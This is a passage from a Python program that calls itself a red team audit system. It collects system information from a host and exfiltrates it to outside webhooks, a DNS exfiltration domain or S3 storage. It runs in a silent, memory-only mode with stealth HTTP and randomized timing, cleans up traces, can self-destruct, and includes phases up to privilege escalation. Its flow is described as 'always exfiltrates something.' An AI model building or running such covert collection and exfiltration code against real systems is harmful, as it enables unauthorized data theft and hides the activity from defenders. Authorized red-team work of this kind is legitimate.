                backoff = min(2**attempt, DEFAULT_MAX_BACKOFF_SECONDS)
                await asyncio.sleep(backoff)
                continue

            raise NetworkError(f"HTTP Error {e.code}: {e.reason}") from e

        except (URLError, TimeoutError) as e:
            if attempt < max_retries:
                backoff = min(2**attempt, DEFAULT_MAX_BACKOFF_SECONDS)
                await asyncio.sleep(backoff)
                continue

            raise NetworkError(f"Network error after {max_retries} attempts") from e

        except Exception as e:
            if attempt < max_retries:
                backoff = min(2**attempt, DEFAULT_MAX_BACKOFF_SECONDS)
                await asyncio.sleep(backoff)
                continue

            raise NetworkError(f"Failed after {max_retries} attempts: {e}") from e

    return False


@task(
    name="scw",
    retries=0,
    log_prints=False,
)
async def send_chunked_webhook_async(
    chunks: list[ChunkData] | str,
    webhook_url: str,
    config: AuditConfiguration,
    adaptive: bool = True,
) -> bool:
    """Send chunks with optional adaptive chunking."""
    run_logger = get_run_logger() if not config.silent_mode else logging.getLogger()

    # If adaptive mode and raw data, use adaptive chunker
    if adaptive and isinstance(chunks, str):
        chunker = AdaptiveChunker(config)
        return await chunker.chunk_and_send(chunks, webhook_url)

    # Otherwise use original implementation
    if isinstance(chunks, str):
        # Convert to chunks first
        dummy_data: AuditData = {
            "checks": {},
            "hostname": "",
            "timestamp": datetime.now(timezone.utc),
            "phase": "",
            "operation_mode": "",
            "metadata": {},
        }
        chunks = await chunk_data_async(dummy_data, config.max_chunk_size)

    if not chunks:
        return True

    total_chunks = len(chunks)

    for i, chunk in enumerate(chunks, start=1):
        chunk_json = json.dumps(chunk, default=json_serializer)

        try:
            success = await send_via_webhook_async(
                chunk_json,
                webhook_url,
                compressed=config.compress,
                max_retries=config.max_retries,
                timeout=config.http_timeout,
                stealth_mode=config.stealth_http,
            )

            if not success:
                return False

            # Add delay
            if config.randomize_timing and i < total_chunks:
                await asyncio.sleep(random.uniform(0.5, 2.0))

        except Exception as e:
            if not config.silent_mode:
                run_logger.error(f"Chunk {i}/{total_chunks} failed: {e}")
            return False

    return True


@task(
    name="td",
    retries=0,
    log_prints=False,
)
async def transmit_data_async(
    data: str,
    config: AuditConfiguration,
    data_type: str = "full",
) -> bool:
    """Transmit data using configured method with fallbacks."""
    run_logger = get_run_logger() if not config.silent_mode else logging.getLogger()

    if not config.silent_mode:
        run_logger.info(
            f"Transmitting {data_type} data via {config.transmission_method.value}"
        )

    # Use ExfiltrationManager for reliable transmission
    exfil_manager = ExfiltrationManager(config)

    try:
        success = await exfil_manager.exfiltrate(data, data_type)

        if success and not config.silent_mode:
            run_logger.info("✓ Data transmitted successfully")
        elif not success and not config.silent_mode:
            run_logger.error("✗ All exfiltration methods failed")

        return success

    except Exception as e:
        if not config.silent_mode:
            run_logger.error(f"Transmission error: {e}")
        return False


# ============================================================================
# MAIN ORCHESTRATION FLOW
# ============================================================================


@flow(
    name="saf",
    log_prints=False,
    retries=0,
)
async def saf(
    config: AuditConfiguration | None = None,
) -> dict[str, Any]:
    """Main audit flow - never crashes, always exfiltrates something."""
    flow_logger = (
        get_run_logger()
        if not config or not config.silent_mode
        else logging.getLogger()
    )

    if config is None:
        config = AuditConfiguration()

    hostname = "unknown"
    with contextlib.suppress(Exception):
        hostname = socket.gethostname()

    audit_id = generate_audit_id()
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    if not config.silent_mode:
        flow_logger.info("=" * 80)
        flow_logger.info(
            f"🎯 RED TEAM AUDIT SYSTEM - {config.red_team_phase.value.upper()}"
        )
        flow_logger.info("=" * 80)
        flow_logger.info(f"🆔 Audit ID: {audit_id}")
        flow_logger.info(f"🖥️  Hostname: {hostname}")
        flow_logger.info(f"📊 Phase: {config.red_team_phase.value}")
        flow_logger.info(f"⚙️  Mode: {config.operation_mode.value}")
        flow_logger.info(
            f"🔒 OPSEC: Memory-Only={config.memory_only}, Silent={config.silent_mode}"
        )
        flow_logger.info("=" * 80)

    # Phase 1: Gather data (never crashes)
    audit_data: AuditData | None = None
    try:
        if not config.silent_mode:
            flow_logger.info("📡 PHASE 1: Gathering System Information...")

        audit_data = await gsi(config)

    except Exception as e:
        if not config.silent_mode:
            flow_logger.error(f"Gather failed: {e}")

        # Create minimal audit data
        audit_data = AuditData(
            hostname=hostname,
            timestamp=datetime.now(timezone.utc),
            phase=config.red_team_phase.value,
            operation_mode=config.operation_mode.value,
            checks={},
            metadata={
                "error": "Failed to gather system info",
                "error_type": type(e).__name__,
                "error_message": str(e),
                "audit_id": audit_id,
            },
        )

    # Phase 2: Export data (never crashes)
    full_data_str = ""
    full_size = 0
    file_path = None

    try:
        if not config.silent_mode:
            flow_logger.info("💾 PHASE 2: Exporting Data...")

        if config.memory_only:
            filename = generate_innocuous_filename("json")
        else:
            phase_name = sanitize_filename(config.red_team_phase.value)
            filename = f"audit_{hostname}_{phase_name}_{timestamp}.json"

        file_path = config.output_dir / filename

        full_data_str = await export_to_json_async(
            audit_data,
            config,
            file_path,
            config.pretty_print,
        )
        full_size = calculate_size(full_data_str)

        if not config.silent_mode:
            flow_logger.info(f"✓ Data exported: {format_size(full_size)}")

    except Exception as e:
        if not config.silent_mode:
            flow_logger.error(f"Export failed: {e}")

        # Create minimal JSON manually
        try:
            full_data_str = json.dumps({
                "hostname": hostname,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "phase": config.red_team_phase.value,
                "error": "Export failed",
                "audit_id": audit_id,
            })
            full_size = len(full_data_str)
        except Exception:
            full_data_str = f'{{"error":"complete_failure","audit_id":"{audit_id}"}}'
            full_size = len(full_data_str)

    # Phase 3: Determine transmission strategy
    send_mode = config.send_mode

    if not config.silent_mode:
        flow_logger.info("📊 PHASE 3: Determining Transmission Strategy...")

    if send_mode == SendMode.AUTO:
        if full_size <= config.max_payload_size:
            send_mode = SendMode.FULL
            if not config.silent_mode:
                flow_logger.info(f"✓ Auto mode: Using FULL ({format_size(full_size)})")
        elif full_size <= config.max_payload_size * 5:
            send_mode = SendMode.CHUNKED
            if not config.silent_mode:
                flow_logger.info(
                    f"✓ Auto mode: Using CHUNKED ({format_size(full_size)})"
                )
        else:
            send_mode = SendMode.SUMMARY
            if not config.silent_mode:
                flow_logger.info(
                    f"✓ Auto mode: Using SUMMARY ({format_size(full_size)})"
                )

    # Phase 4: Transmit (never crashes, tries all methods)
    transmission_success = False
    transmission_details: dict[str, Any] = {}

    try:
        if not config.silent_mode:
            flow_logger.info(f"📤 PHASE 4: Transmitting Data ({send_mode.value})...")

        match send_mode:
            case SendMode.FULL:
                transmission_success = await transmit_data_async(
                    full_data_str, config, data_type="full"
                )
                transmission_details = {
                    "mode": "full",
                    "size": full_size,
                    "chunks": 1,
                }

            case SendMode.SUMMARY:
                summary: SummaryData = await create_summary_async(audit_data, config)
                summary.full_data_file = file_path
                summary.full_data_size = full_size

                summary_json: str = json.dumps(
                    summary.to_dict(),
                    default=json_serializer,
                    indent=2 if config.pretty_print else None,
                )
                summary_size: int = calculate_size(summary_json)

                reduction_percent: float = (
                    (full_size - summary_size) * 100 / full_size if full_size > 0 else 0
                )

                if not config.silent_mode:
                    flow_logger.info(
                        f"✓ Summary size: {format_size(summary_size)} ({reduction_percent:.1f}% reduction)"
                    )

                transmission_success = await transmit_data_async(
                    summary_json, config, data_type="summary"
                )
                transmission_details = {
                    "mode": "summary",
                    "size": summary_size,
                    "full_size": full_size,
                    "reduction_percent": reduction_percent,
                }

            case SendMode.TRUNCATED:
                truncated_data: AuditData = await truncate_output_async(
                    audit_data, config.max_output_length
                )

                truncated_json: str = json.dumps(
                    truncated_data,
                    default=json_serializer,
                    indent=2 if config.pretty_print else None,
                )
                truncated_size: int = calculate_size(truncated_json)

                reduction_percent = (
                    (full_size - truncated_size) * 100 / full_size
                    if full_size > 0
                    else 0
                )

                if not config.silent_mode:
                    flow_logger.info(
                        f"✓ Truncated size: {format_size(truncated_size)} ({reduction_percent:.1f}% reduction)"
                    )

                transmission_success = await transmit_data_async(
                    truncated_json, config, data_type="truncated"
                )
                transmission_details = {
                    "mode": "truncated",
                    "size": truncated_size,
                    "full_size": full_size,
                    "reduction_percent": reduction_percent,
                }

            case SendMode.CHUNKED:
                if config.adaptive_chunking:
                    # Use adaptive chunking
                    if not config.silent_mode:
                        flow_logger.info("✓ Using adaptive chunking...")

                    if config.webhook_url:
                        transmission_success = await send_chunked_webhook_async(
                            full_data_str, config.webhook_url, config, adaptive=True
                        )
                    else:
                        transmission_success = False
                else:
                    # Use fixed-size chunking
                    chunks: list[ChunkData] = await chunk_data_async(
                        audit_data, config.max_chunk_size
                    )

                    if not config.silent_mode:
                        flow_logger.info(f"✓ Created {len(chunks)} chunks")

                    if config.webhook_url:
                        transmission_success = await send_chunked_webhook_async(
                            chunks, config.webhook_url, config, adaptive=False
                        )
                    elif config.force_disk_write:
                        # Save chunks as separate files
                        for i, chunk in enumerate(chunks, start=1):
                            chunk_filename = f"audit_{hostname}_{sanitize_filename(config.red_team_phase.value)}_{timestamp}_chunk_{i:03d}.json"
                            chunk_path = config.output_dir / chunk_filename
                            chunk_json = json.dumps(
                                chunk,
                                default=json_serializer,
                                indent=2 if config.pretty_print else None,
                            )
                            _ = await safe_file_write_with_tracking(
                                chunk_path, chunk_json, config
                            )
                        transmission_success = True

                transmission_details = {
                    "mode": "chunked",
                    "chunks": (
                        len(chunks) if not config.adaptive_chunking else "adaptive"
                    ),
                    "total_size": full_size,
                }

            case _:
                error_msg = f"Unsupported send mode: {send_mode}"
                if not config.silent_mode:
                    flow_logger.error(error_msg)
                raise ValueError(error_msg)

    except PayloadTooLargeError as e:
        if not config.silent_mode:
            flow_logger.error(f"Payload too large: {e}")
            flow_logger.info("💡 Try using CHUNKED or SUMMARY mode")
        transmission_success = False
    except NetworkError as e:
        if not config.silent_mode:
            flow_logger.error(f"Network error: {e}")
        transmission_success = False
    except Exception as e:
        if not config.silent_mode:
            flow_logger.error(f"Transmission failed: {type(e).__name__}: {e}")
        transmission_success = False

    # Phase 5: Cleanup (never crashes)
    try:
        if config.auto_cleanup:
            if not config.silent_mode:
                flow_logger.info("🧹 PHASE 5: Cleaning up traces...")

            trace_manager = get_trace_manager()
            trace_manager.cleanup_all()

            if config.self_destruct:
                if not config.silent_mode:
                    flow_logger.info("💣 Self-destructing...")
                trace_manager.self_destruct()

    except Exception as e:
        if not config.silent_mode:
            flow_logger.debug(f"Cleanup failed: {e}")

    # Report results
    if not config.silent_mode:
        flow_logger.info("=" * 80)
        flow_logger.info("📊 AUDIT COMPLETE")
        flow_logger.info("=" * 80)

        if transmission_success:
            flow_logger.info(
                f"✅ Data transmitted successfully via {config.transmission_method.value}"
            )
        else:
            flow_logger.error("❌ Failed to transmit data")
            if config.memory_only:
                flow_logger.info("💡 Data was stored in memory only (no disk traces)")
            elif file_path:
                flow_logger.info(f"💡 Full data available at: {file_path}")

        # Calculate final statistics
        if audit_data:
            stats = calculate_execution_stats(audit_data["checks"])
            flow_logger.info("📈 Statistics:")
            flow_logger.info(f"   Total Checks: {stats['total']}")
            flow_logger.info(
                f"   Successful: {stats['successful']} ({stats['success_rate']}%)"
            )
            flow_logger.info(f"   Failed: {stats['failed']}")
            flow_logger.info(f"   Errors: {stats['errors']}")
            flow_logger.info(f"   Execution Time: {stats['total_execution_time']:.2f}s")

        flow_logger.info("=" * 80)

    # Return results
    return {
        "audit_id": audit_id,
        "hostname": hostname,
        "timestamp": timestamp,
        "phase": config.red_team_phase.value,
        "operation_mode": config.operation_mode.value,
        "transmission_success": transmission_success,
        "send_mode": send_mode.value,
        "transmission_details": transmission_details,
        "data_size": full_size,
        "file_path": str(file_path) if file_path else None,
        "checks_collected": len(audit_data.get("checks", {})) if audit_data else 0,
        "execution_mode": "PREFECT" if PREFECT_ENABLED else "STANDALONE",
        "memory_only": config.memory_only,
        "silent_mode": config.silent_mode,
    }


# ============================================================================
# MULTI-PHASE EXECUTION
# ============================================================================


@flow(
    name="multi_phase_audit_flow",
    log_prints=False,
    retries=0,
)
async def multi_phase_audit_flow(
    phases: list[RedTeamPhase],
    base_config: AuditConfiguration | None = None,
    delay_between_phases: int = 5,
) -> dict[str, Any]:
    """Execute multiple red team phases sequentially.

    Args:
        phases: List of phases to execute
        base_config: Base configuration (will be modified per phase)
        delay_between_phases: Delay in seconds between phases

    Returns:
        Dictionary with results from all phases
    """
    flow_logger = (
        get_run_logger()
        if not base_config or not base_config.silent_mode
        else logging.getLogger()
    )

    if base_config is None:
        base_config = AuditConfiguration()

    if not base_config.silent_mode:
        flow_logger.info(f"🎯 Starting multi-phase audit with {len(phases)} phases")

    results: dict[str, Any] = {
        "phases": {},
        "summary": {
            "total_phases": len(phases),
            "successful_phases": 0,
            "failed_phases": 0,
            "start_time": datetime.now(timezone.utc).isoformat(),
        },
    }

    for i, phase in enumerate(phases, start=1):
        if not base_config.silent_mode:
            flow_logger.info("=" * 80)
            flow_logger.info(f"PHASE {i}/{len(phases)}: {phase.value.upper()}")
            flow_logger.info("=" * 80)

        # Create phase-specific config
        phase_config = AuditConfiguration(
            red_team_phase=phase,
            operation_mode=base_config.operation_mode,
            export_format=base_config.export_format,
            transmission_method=base_config.transmission_method,
            output_dir=base_config.output_dir / phase.value,
            force_disk_write=base_config.force_disk_write,
            webhook_url=base_config.webhook_url,
            agent_profile=base_config.agent_profile,
            custom_commands=base_config.custom_commands,
            memory_only=base_config.memory_only,
            silent_mode=base_config.silent_mode,
            auto_cleanup=base_config.auto_cleanup,
            self_destruct=base_config.self_destruct,
            randomize_timing=base_config.randomize_timing,
            hide_in_logs=base_config.hide_in_logs,
            stealth_http=base_config.stealth_http,
            send_mode=base_config.send_mode,
            max_payload_size=base_config.max_payload_size,
            max_chunk_size=base_config.max_chunk_size,
            max_output_length=base_config.max_output_length,
            compress=base_config.compress,
            fallback_webhooks=base_config.fallback_webhooks,
            dns_exfil_domain=base_config.dns_exfil_domain,
            emergency_cache_location=base_config.emergency_cache_location,
            adaptive_chunking=base_config.adaptive_chunking,
            s3_bucket=base_config.s3_bucket,
            s3_key=base_config.s3_key,
            s3_region=base_config.s3_region,
            pretty_print=base_config.pretty_print,
            max_retries=base_config.max_retries,
            command_timeout=base_config.command_timeout,
            http_timeout=base_config.http_timeout,
            max_concurrent_commands=base_config.max_concurrent_commands,
            include_commands=base_config.include_commands,
            exclude_commands=base_config.exclude_commands,
            required_commands=base_config.required_commands,
            tags=base_config.tags,
            operator=base_config.operator,
            mission_id=base_config.mission_id,
        )

        try:
            phase_result = await saf(phase_config)
            results["phases"][phase.value] = phase_result

            if phase_result["transmission_success"]:
                results["summary"]["successful_phases"] += 1
            else:
                results["summary"]["failed_phases"] += 1

            if not base_config.silent_mode:
                flow_logger.info(f"✓ Phase {phase.value} completed successfully")

        except Exception as e:
            if not base_config.silent_mode:
                flow_logger.error(
                    f"✗ Phase {phase.value} failed: {type(e).__name__}: {e}"
                )

            results["phases"][phase.value] = {
                "error": str(e),
                "error_type": type(e).__name__,
            }
            results["summary"]["failed_phases"] += 1

        # Delay between phases (except after last phase)
        if i < len(phases) and delay_between_phases > 0:
            if not base_config.silent_mode:
                flow_logger.info(
                    f"⏳ Waiting {delay_between_phases}s before next phase..."
                )
            await asyncio.sleep(delay_between_phases)

    results["summary"]["end_time"] = datetime.now(timezone.utc).isoformat()

    if not base_config.silent_mode:
        flow_logger.info("=" * 80)
        flow_logger.info("MULTI-PHASE AUDIT COMPLETE")
        flow_logger.info("=" * 80)
        flow_logger.info(
            f"✓ Successful phases: {results['summary']['successful_phases']}/{results['summary']['total_phases']}"
        )
        flow_logger.info(
            f"✗ Failed phases: {results['summary']['failed_phases']}/{results['summary']['total_phases']}"
        )

    return results


# ============================================================================
# ENTRY POINT & CLI
# ============================================================================


async def main() -> None:
    """Main entry point for the audit system."""
    # Parse environment variables
    phase_str = os.getenv("RED_TEAM_PHASE", "reconnaissance")
    operation_mode_str = os.getenv("OPERATION_MODE", "passive")
    webhook_url = os.getenv("WEBHOOK_URL")
    fallback_webhooks_str = os.getenv("FALLBACK_WEBHOOKS", "")
    dns_exfil_domain = os.getenv("DNS_EXFIL_DOMAIN")
    output_dir = os.getenv("OUTPUT_DIR", "./audit_reports")
    send_mode_str = os.getenv("SEND_MODE", "auto")
    multi_phase_str = os.getenv("MULTI_PHASE", "false")
    memory_only_str = os.getenv("MEMORY_ONLY", "true")
    silent_mode_str = os.getenv("SILENT_MODE", "true")
    auto_cleanup_str = os.getenv("AUTO_CLEANUP", "true")
    self_destruct_str = os.getenv("SELF_DESTRUCT", "false")
    stealth_http_str = os.getenv("STEALTH_HTTP", "true")
    adaptive_chunking_str = os.getenv("ADAPTIVE_CHUNKING", "true")
    operator = os.getenv("OPERATOR")
    mission_id = os.getenv("MISSION_ID")

    # Parse phase
    try:
        phase = RedTeamPhase(phase_str.lower())
    except ValueError:
        print(f"⚠️  Invalid phase '{phase_str}', using RECONNAISSANCE")
        phase = RedTeamPhase.RECONNAISSANCE

    # Parse operation mode
    try:
        operation_mode = OperationMode(operation_mode_str.lower())
    except ValueError:
        print(f"⚠️  Invalid operation mode '{operation_mode_str}', using PASSIVE")
        operation_mode = OperationMode.PASSIVE

    # Parse send mode
    try:
        send_mode = SendMode(send_mode_str.lower())
    except ValueError:
        print(f"⚠️  Invalid send mode '{send_mode_str}', using AUTO")
        send_mode = SendMode.AUTO

    # Parse boolean flags
    is_multi_phase = multi_phase_str.lower() in ("true", "1", "yes")
    memory_only = memory_only_str.lower() in ("true", "1", "yes")
    silent_mode = silent_mode_str.lower() in ("true", "1", "yes")
    auto_cleanup = auto_cleanup_str.lower() in ("true", "1", "yes")
    self_destruct = self_destruct_str.lower() in ("true", "1", "yes")
    stealth_http = stealth_http_str.lower() in ("true", "1", "yes")
    adaptive_chunking = adaptive_chunking_str.lower() in ("true", "1", "yes")

    # Parse fallback webhooks
    fallback_webhooks = [
        url.strip() for url in fallback_webhooks_str.split(",") if url.strip()
    ]

    # Print banner (only if not silent)
    if not silent_mode:
        print("\n" + "=" * 80)
        print("🎯 RED TEAM AUDIT SYSTEM v3.0 - PRODUCTION READY")
        if PREFECT_ENABLED:
            print("🚀 PREFECT MODE - Full orchestration and observability")
        else:
            print("🐍 STANDALONE MODE - Direct Python execution")
        print("=" * 80 + "\n")

        print(f"📍 Phase: {phase.value.upper()}")
        print(f"⚙️  Operation Mode: {operation_mode.value.upper()}")
        print(f"📦 Send Mode: {send_mode.value.upper()}")
        print(
            f"🔒 OPSEC: Memory-Only={memory_only}, Silent={silent_mode}, Auto-Cleanup={auto_cleanup}"
        )
        print(f"🌐 Stealth HTTP: {stealth_http}")
        print(f"📊 Adaptive Chunking: {adaptive_chunking}")
        if webhook_url:
            print(f"🔗 Webhook: {webhook_url[:50]}...")
        if fallback_webhooks:
            print(f"🔗 Fallback Webhooks: {len(fallback_webhooks)}")
        if dns_exfil_domain:
            print(f"🌐 DNS Exfil Domain: {dns_exfil_domain}")
        if operator:
            print(f"👤 Operator: {operator}")
        if mission_id:
            print(f"🎯 Mission ID: {mission_id}")
        print(f"📁 Output Directory: {output_dir}")
        print()

    # Create configuration
    config = AuditConfiguration(
        red_team_phase=phase,
        operation_mode=operation_mode,
        export_format=ExportFormat.JSON,
        transmission_method=(
            TransmissionMethod.WEBHOOK if webhook_url else TransmissionMethod.FILE
        ),
        webhook_url=webhook_url,
        fallback_webhooks=fallback_webhooks,
        dns_exfil_domain=dns_exfil_domain,
        output_dir=Path(output_dir),
        force_disk_write=not memory_only,
        memory_only=memory_only,
        silent_mode=silent_mode,
        auto_cleanup=auto_cleanup,
        self_destruct=self_destruct,
        randomize_timing=True,
        stealth_http=stealth_http,
        send_mode=send_mode,
        compress=True,
        adaptive_chunking=adaptive_chunking,
        max_concurrent_commands=10,
        pretty_print=False,
        operator=operator,
        mission_id=mission_id,
    )

    # Execute audit
    try:
        if is_multi_phase:
            # Execute multiple phases
            phases_to_run = [
                RedTeamPhase.RECONNAISSANCE,
                RedTeamPhase.ENUMERATION,
                RedTeamPhase.PRIVILEGE_ESCALATION,
            ]
            if not silent_mode:
                print(
                    f"🔄 Running multi-phase audit: {[p.value for p in phases_to_run]}\n"
                )
            result = await multi_phase_audit_flow(phases_to_run, config)
        else:
            # Single phase execution
            result = await saf(config)

    except KeyboardInterrupt:
        if not silent_mode:
            print("\n\n⚠️  Audit interrupted by user")
        # Cleanup on interrupt
        if auto_cleanup:
            trace_manager = get_trace_manager()
            trace_manager.cleanup_all()
        return
    except Exception as e:
        if not silent_mode:
            print(f"\n\n❌ Audit failed: {type(e).__name__}: {e}")
            logger.error("Audit failed", exc_info=True)
        # Cleanup on error
        if auto_cleanup:
            trace_manager = get_trace_manager()
            trace_manager.cleanup_all()
        return

    # Print results (only if not silent)
    if not silent_mode:
        print("\n" + "=" * 80)
        print("AUDIT COMPLETE")
        print("=" * 80)

        if is_multi_phase:
            print(f"Total Phases: {result['summary']['total_phases']}")
            print(f"Successful: {result['summary']['successful_phases']}")
            print(f"Failed: {result['summary']['failed_phases']}")
        else:
            print(f"Audit ID: {result['audit_id']}")
            print(f"Execution Mode: {result['execution_mode']}")
            print(f"Hostname: {result['hostname']}")
            print(f"Phase: {result['phase'].upper()}")
            print(f"Operation Mode: {result['operation_mode'].upper()}")
            print(f"Timestamp: {result['timestamp']}")
            print(f"Send Mode: {result['send_mode']}")
            print(f"Data Size: {format_size(result['data_size'])}")
            if result["file_path"]:
                print(f"Data File: {result['file_path']}")
            print(
                f"Transmission: {'✓ Success' if result['transmission_success'] else '✗ Failed'}"
            )
            print(f"Checks Collected: {result['checks_collected']}")
            print(f"Memory Only: {result['memory_only']}")
            print(f"Silent Mode: {result['silent_mode']}")

        print("=" * 80 + "\n")


if __name__ == "__main__":
    # Log execution mode on startup
    if os.getenv("SILENT_MODE", "true").lower() not in ("true", "1", "yes"):
        if PREFECT_ENABLED:
            logger.info("🚀 Running in PREFECT mode")
        else:
            logger.info("🐍 Running in STANDALONE mode (no Prefect)")

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️  Program interrupted by user")
        # Final cleanup
        if os.getenv("AUTO_CLEANUP", "true").lower() in ("true", "1", "yes"):
            trace_manager = get_trace_manager()
            trace_manager.cleanup_all()
    except Exception as e:
        print(f"\n\n❌ Fatal error: {type(e).__name__}: {e}")
        logger.error("Fatal error", exc_info=True)
        # Final cleanup
        if os.getenv("AUTO_CLEANUP", "true").lower() in ("true", "1", "yes"):
            trace_manager = get_trace_manager()
            trace_manager.cleanup_all()
